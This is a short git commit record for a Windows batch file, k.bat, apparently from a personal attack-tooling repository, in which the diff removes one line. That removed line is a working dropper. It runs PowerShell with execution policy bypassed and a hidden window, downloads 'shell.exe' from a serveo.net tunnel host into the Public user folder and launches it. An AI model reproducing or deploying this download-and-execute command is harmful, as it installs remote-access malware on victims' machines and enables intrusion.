0166073190aeb5b412e7a912c432c326583b87a5
johnngugihack <hackhack2h@gmail.com>
2025-03-01 07:42:05 +0300

    Update k.bat

--- k.bat
+++ k.bat
@@ -1,2 +1,1 @@
 @echo off
-powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://0c59ceb3e2c6b22bbec7e59987bde4b4.serveo.net/shell.exe' -OutFile 'C:\Users\Public\shell.exe'; Start-Process 'C:\Users\Public\shell.exe'"
